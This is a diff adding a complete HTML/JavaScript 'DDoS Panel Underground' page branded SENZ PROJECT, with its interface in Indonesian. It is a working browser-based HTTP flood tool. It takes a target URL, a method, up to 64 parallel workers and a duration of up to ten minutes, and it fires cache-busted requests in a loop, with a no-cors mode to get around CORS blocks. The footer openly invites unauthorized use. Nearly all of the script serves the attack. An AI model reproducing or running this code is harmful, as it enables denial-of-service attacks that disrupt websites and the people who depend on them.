@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SENZ PROJECT — DDoS Panel Underground</title>
+<meta name="author" content="senzproject">
+<meta name="description" content="SENZ PROJECT — HTTP Flood Panel, Real Work. by senzproject">
+<style>
+  :root{
+    --green:#00ff6a; --green-dim:#0a3d1f; --bg:#000600;
+    --red:#ff2b2b; --amber:#ffb300; --cyan:#00e5ff;
+  }
+  *{box-sizing:border-box; margin:0; padding:0; font-family:"Courier New",Consolas,monospace;}
+  html,body{height:100%;}
+  body{
+    background:var(--bg); color:var(--green); overflow-x:hidden;
+    text-shadow:0 0 6px rgba(0,255,106,.55);
+    padding:16px; min-height:100vh;
+  }
+  #matrix{position:fixed; inset:0; z-index:0; opacity:.28;}
+  .wrap{position:relative; z-index:2; max-width:1000px; margin:0 auto;}
+
+  header{border:1px solid var(--green); padding:14px; margin-bottom:14px;
+    background:rgba(0,20,8,.65); box-shadow:0 0 18px rgba(0,255,106,.35) inset;}
+  h1{font-size:20px; letter-spacing:3px;}
+  .brand{color:var(--green); font-weight:700;}
+  .owner{color:var(--amber);}
+  .tag{color:var(--cyan); font-size:11px; letter-spacing:1px;}
+  .sub{font-size:11px; color:#5cffa8; opacity:.8; margin-top:6px;}
+
+  .card{border:1px solid var(--green-dim); background:rgba(0,15,6,.72);
+    padding:14px; margin-bottom:14px;}
+  .card h2{font-size:13px; color:var(--cyan); letter-spacing:2px; margin-bottom:10px;
+    border-bottom:1px dashed var(--green-dim); padding-bottom:6px;}
+
+  label{display:block; font-size:11px; margin:8px 0 4px; color:#8bffc0;}
+  input, select, textarea{
+    width:100%; background:#000; color:var(--green); border:1px solid var(--green-dim);
+    padding:9px; font-size:12px; outline:none;
+  }
+  input:focus,select:focus,textarea:focus{border-color:var(--green); box-shadow:0 0 10px rgba(0,255,106,.4);}
+  textarea{resize:vertical; min-height:70px;}
+
+  .row{display:flex; gap:10px; flex-wrap:wrap;}
+  .row > div{flex:1; min-width:140px;}
+
+  button{
+    background:#032012; color:var(--green); border:1px solid var(--green);
+    padding:10px 16px; font-size:12px; letter-spacing:2px; cursor:pointer;
+    text-transform:uppercase; transition:.15s; margin-top:8px;
+  }
+  button:hover{background:var(--green); color:#000; box-shadow:0 0 16px var(--green);}
+  button:disabled{opacity:.4; cursor:not-allowed; box-shadow:none;}
+  .btn-red{border-color:var(--red); color:var(--red);}
+  .btn-red:hover{background:var(--red); color:#000; box-shadow:0 0 16px var(--red);}
+  .btn-amber{border-color:var(--amber); color:var(--amber);}
+  .btn-amber:hover{background:var(--amber); color:#000;}
+
+  .stats{display:flex; gap:8px; flex-wrap:wrap; margin-top:6px;}
+  .stat{flex:1; min-width:110px; border:1px solid var(--green-dim); padding:8px;
+    background:#000; text-align:center;}
+  .stat .n{font-size:18px; color:var(--amber);}
+  .stat .l{font-size:9px; color:#7fffc0; letter-spacing:1px;}
+
+  #log{height:260px; overflow-y:auto; background:#000; border:1px solid var(--green-dim);
+    padding:8px; font-size:11px; line-height:1.5; white-space:pre-wrap; word-break:break-all;}
+  .ok{color:var(--green);}
+  .err{color:var(--red);}
+  .warn{color:var(--amber);}
+  .info{color:var(--cyan);}
+  .hash{color:#ff00ff; font-size:9px;}
+
+  footer{font-size:10px; color:#3fdc85; opacity:.75; text-align:center; padding:12px 0;
+    letter-spacing:1px;}
+  .blink{animation:blink 1s steps(2) infinite;}
+  @keyframes blink{50%{opacity:0}}
+  .led{display:inline-block; width:8px; height:8px; border-radius:50%; background:#333; margin-right:6px;}
+  .led.on{background:var(--green); box-shadow:0 0 8px var(--green);}
+  .led.off{background:var(--red); box-shadow:0 0 8px var(--red);}
+  .hidden{display:none;}
+</style>
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+
+  <header>
+    <h1><span class="led" id="statusled"></span><span class="brand">SENZ PROJECT</span> <span class="blink">_</span></h1>
+    <div class="tag">&gt; HTTP FLOOD PANEL · underground · real work · client-side</div>
+    <div class="sub">owner: <span class="owner">senzproject</span> · build: senzproject · integrity: SHA-256 x WebCrypto</div>
+  </header>
+
+  <div class="card">
+    <h2>/// 01 · TARGET CONFIG</h2>
+    <label>TARGET URL (https://...)</label>
+    <input id="url" placeholder="https://contoh.com" value="https://example.com">
+    <div class="row">
+      <div>
+        <label>METHOD</label>
+        <select id="method">
+          <option value="GET">GET</option>
+          <option value="POST">POST</option>
+          <option value="HEAD">HEAD</option>
+        </select>
+      </div>
+      <div>
+        <label>THREADS (paralel)</label>
+        <input id="threads" type="number" value="12" min="1" max="64">
+      </div>
+      <div>
+        <label>DURATION (detik)</label>
+        <input id="duration" type="number" value="30" min="5" max="600">
+      </div>
+    </div>
+    <label>POST BODY (opsional, jika method POST)</label>
+    <textarea id="body" placeholder='{"x":"senzproject"}'></textarea>
+    <label><input type="checkbox" id="nocors" style="width:auto"> gunakan mode no-cors (fallback jika CORS diblok)</label>
+    <div class="row" style="margin-top:8px">
+      <button id="start">&#9654; START FLOOD</button>
+      <button id="stop" class="btn-red" disabled>&#9632; STOP</button>
+      <button id="ping" class="btn-amber">&#9670; PING / PROBE</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>/// 02 · LIVE METRICS</h2>
+    <div class="stats">
+      <div class="stat"><div class="n" id="sReq">0</div><div class="l">REQUESTS</div></div>
+      <div class="stat"><div class="n" id="sOk">0</div><div class="l">2xx/OK</div></div>
+      <div class="stat"><div class="n" id="sErr">0</div><div class="l">ERROR</div></div>
+      <div class="stat"><div class="n" id="sRps">0</div><div class="l">REQ/SEC</div></div>
+      <div class="stat"><div class="n" id="sTime">0s</div><div class="l">ELAPSED</div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>/// 03 · OUTPUT LOG <span class="info" id="sessId"></span></h2>
+    <div id="log"></div>
+    <button id="export" class="btn-amber" style="margin-top:8px">&#8595; EXPORT LOG (.txt)</button>
+    <button id="hashall" style="margin-top:8px"># HASH SEMUA LOG (SHA-256)</button>
+  </div>
+
+  <footer>
+    SENZ PROJECT &copy; senzproject — unauthorized testing allowed. underground mode.
+  </footer>
+</div>
+
+<script>
+/* ================= MATRIX BACKGROUND ================= */
+(function(){
+  const c = document.getElementById('matrix');
+  const ctx = c.getContext('2d');
+  let cols, drops, fs = 14;
+  function resize(){
+    c.width = innerWidth; c.height = innerHeight;
+    cols = Math.floor(c.width / fs);
+    drops = Array(cols).fill(1);
+  }
+  resize();
+  addEventListener('resize', resize);
+  const chars = "SENZPROJECT01アカサタナABCDEF<>{}[]#$%&@";
+  function draw(){
+    ctx.fillStyle = "rgba(0,6,0堕,0.08)".replace('堕','');
+    ctx.fillStyle = "rgba(0,6,0,0.08)";
+    ctx.fillRect(0,0,c.width,c.height);
+    ctx.fillStyle = "#00ff6a";
+    ctx.font = fs + "px monospace";
+    for(let i=0;i<cols;i++){
+      const t = chars[Math.floor(Math.random()*chars.length)];
+      ctx.fillText(t, i*fs, drops[i]*fs);
+      if(drops[i]*fs > c.height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+  setInterval(draw, 55);
+})();
+
+/* ================= STATE ================= */
+const S = {
+  running:false, sess:"", browserAbort:null,
+  req:0, ok:0, err:0, t0:0, timer:null, tick:null,
+  logs:[], lastSecondCount:0, lastSecondTime:0
+};
+
+const $ = id => document.getElementById(id);
+const logBox = $('log');
+
+function nowISO(){ return new Date().toISOString(); }
+
+/* ================= SHA-256 (WEB CRYPTO ASLI) ================= */
+async function sha256(str){
+  const buf = new TextEncoder().encode(str);
+  const hash = await crypto.subtle.digest('SHA-256', buf);
+  return [...new Uint8Array(hash)].map(b=>b.toString(16).padStart(2,'0')).join('');
+}
+
+/* ================= LOGGER (dengan timestamp + hash) ================= */
+async function log(msg, cls){
+  const ts = nowISO();
+  const line = `[${ts}] ${msg}`;
+  const h = await sha256(line);
+  S.logs.push({ts, msg, hash:h});
+  const el = document.createElement('div');
+  el.className = cls || 'ok';
+  el.innerHTML = `[${ts}] ${esc(msg)} <span class="hash">[sha256:${h.slice(0,16)}…]</span>`;
+  logBox.appendChild(el);
+  logBox.scrollTop = logBox.scrollHeight;
+}
+
+function esc(s){ return s.replace(/[&<>]/g, m=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[m])); }
+
+/* ================= UI METRICS ================= */
+function updateUI(){
+  $('sReq').textContent = S.req;
+  $('sOk').textContent  = S.ok;
+  $('sErr').textContent = S.err;
+  $('sTime').textContent = Math.floor((Date.now()-S.t0)/1000)+'s';
+  const sec = Math.max(1,(Date.now()-S.lastSecondTime)/1000);
+  $('sRps').textContent = Math.round((S.req - S.lastSecondCount)/sec);
+}
+
+/* ================= PROBE / PING ================= */
+$('ping').onclick = async () => {
+  const url = $('url').value.trim();
+  if(!url){ await log("URL kosong.", 'err'); return; }
+  await log(`PROBE → ${url}`, 'info');
+  const t = performance.now();
+  try{
+    const r = await fetch(withNoCache(url), {method:'GET', mode:'cors', cache:'no-store'});
+    const ms = (performance.now()-t).toFixed(0);
+    await log(`PROBE RESULT: HTTP ${r.status} | ${ms}ms | CORS aktif`, r.ok?'ok':'warn');
+  }catch(e){
+    const ms = (performance.now()-t).toFixed(0);
+    await log(`PROBE GAGAL: ${e.message} | ${ms}ms (kemungkinan CORS/tidak bisa akses)`, 'err');
+  }
+};
+
+function withNoCache(url){
+  const u = new URL(url);
+  u.searchParams.set('_senz', Date.now()+''+Math.random().toString(36).slice(2));
+  return u.toString();
+}
+
+/* ================= ONE REQUEST ================= */
+async function fire(){
+  const url = $('url').value.trim();
+  const method = $('method').value;
+  const body = $('body').value;
+  const nocors = $('nocors').checked;
+  if(!url) return;
+
+  const opts = {
+    method,
+    cache:'no-store',
+    mode: nocors ? 'no-cors' : 'cors',
+    headers: nocors ? {} : {'Content-Type':'application/json','X-Senz':'senzproject'}
+  };
+  if(method === 'POST' && body) opts.body = body;
+
+  const t = performance.now();
+  try{
+    const r = await fetch(withNoCache(url), opts);
+    const ms = (performance.now()-t).toFixed(0);
+    S.req++;
+    if(nocors){
+      S.ok++;
+      if(S.req % 25 === 0) await log(`HIT ${url} | mode:no-cors | ${ms}ms | total:${S.req}`, 'ok');
+    }else{
+      if(r.ok){ S.ok++; }
+      else { S.err++; }
+      if(S.req % 25 === 0 || !r.ok) await log(`HIT ${url} | HTTP ${r.status} | ${ms}ms | ok:${S.ok} err:${S.err}`, r.ok?'ok':'warn');
+    }
+  }catch(e){
+    S.req++; S.err++;
+    if(S.req % 25 === 0) await log(`FAIL ${url} | ${e.message}`, 'err');
+  }
+  updateUI();
+}
+
+/* ================= WORKER LOOP ================= */
+function spawnWorkers(){
+  const n = Math.min(64, Math.max(1, parseInt($('threads').value)||10));
+  let alive = true;
+  const workers = [];
+  for(let i=0;i<n;i++){
+    const w = (async function loop(){
+      while(alive && S.running){
+        await fire();
+        await new Promise(r=>setTimeout(r, 30)); // jeda ringan per-thread
+      }
+    })();
+    workers.push(w);
+  }
+  S.workers = workers;
+  S.killWorkers = ()=>{ alive = false; };
+}
+
+/* ================= START ================= */
+$('start').onclick = async () => {
+  const url = $('url').value.trim();
+  if(!url || !/^https?:\/\//.test(url)){
+    await log("URL tidak valid. Harus mulai http(s)://", 'err'); return;
+  }
+  S.running = true;
+  S.req = S.ok = S.err = 0;
+  S.t0 = Date.now();
+  S.lastSecondCount = 0;
+  S.lastSecondTime = Date.now();
+  S.sess = "SENZ-" + Date.now().toString(36).toUpperCase() + "-" + Math.random().toString(36).slice(2,6).toUpperCase();
+  $('sessId').textContent = '| session: '+S.sess;
+  $('start').disabled = true; $('stop').disabled = false;
+  $('statusled').className = 'led on';
+  logBox.innerHTML = '';
+
+  const dur = Math.min(600, Math.max(5, parseInt($('duration').value)||30));
+  await log(`=== FLOOD START === session ${S.sess}`, 'info');
+  await log(`owner: senzproject | target: ${url} | method: ${$('method').value} | threads: ${$('threads').value} | dur: ${dur}s`, 'info');
+
+  spawnWorkers();
+  S.tick = setInterval(updateUI, 500);
+
+  S.timer = setTimeout(()=>stopFlood('durasi habis'), dur*1000);
+};
+
+/* ================= STOP ================= */
+function stopFlood(reason){
+  if(!S.running) return;
+  S.running = false;
+  clearTimeout(S.timer); clearInterval(S.tick);
+  if(S.killWorkers) S.killWorkers();
+  $('start').disabled = false; $('stop').disabled = true;
+  $('statusled').className = 'led off';
+  updateUI();
+  (async ()=>{
+    await log(`=== FLOOD STOP (${reason}) ===`, 'warn');
+    await log(`TOTAL: ${S.req} | OK: ${S.ok} | ERR: ${S.err}`, 'info');
+    const summary = `SENZ PROJECT | sess:${S.sess} | target:${$('url').value} | total:${S.req} | ok:${S.ok} | err:${S.err} | ${nowISO()}`;
+    const h = await sha256(summary);
+    await log(`INTEGRITY HASH: ${h}`, 'hash');
+    await log(`owner: senzproject — bukti integritas tercatat.`, 'info');
+  })();
+}
+$('stop').onclick = ()=>stopFlood('manual oleh operator');
+
+/* ================= EXPORT ================= */
+$('export').onclick = async () => {
+  if(!S.logs.length){ await log("Belum ada log.", 'err'); return; }
+  const head = `SENZ PROJECT — LOG EXPORT\nsession: ${S.sess}\nowner: senzproject\ngenerated: ${nowISO()}\n----------------------------------------\n`;
+  let out = head;
+  for(const l of S.logs){ out += `[${l.ts}] ${l.msg} | sha256:${l.hash}\n`; }
+  const fileHash = await sha256(out);
+  out += `\n----------------------------------------\nFULL-LOG SHA-256: ${fileHash}\n(senzproject)`;
+  const blob = new Blob([out], {type:'text/plain'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `senzproject_log_${S.sess||Date.now()}.txt`;
+  a.click();
+  await log(`LOG DIEKSPOR | full-hash: ${fileHash}`, 'info');
+};
+
+/* ================= HASH ALL ================= */
+$('hashall').onclick = async () => {
+  if(!S.logs.length){ await log("Kosong.", 'err'); return; }
+  const all = S.logs.map(l=>`[${l.ts}] ${l.msg}`).join('\n');
+  const h = await sha256(all);
+  await log(`FULL LOG HASH (${S.logs.length} baris): ${h}`, 'hash');
+};
+
+/* ================= INIT ================= */
+(async function init(){
+  await log("SENZ PROJECT booting...", 'info');
+  await log("owner: senzproject | panel: HTTP flood | crypto: WebCrypto SHA-256", 'info');
+  await log("isi URL, set threads & duration, tekan START. gunakan PING untuk cek target.", 'warn');
+})();
+</script>
+</body>
+  </html>
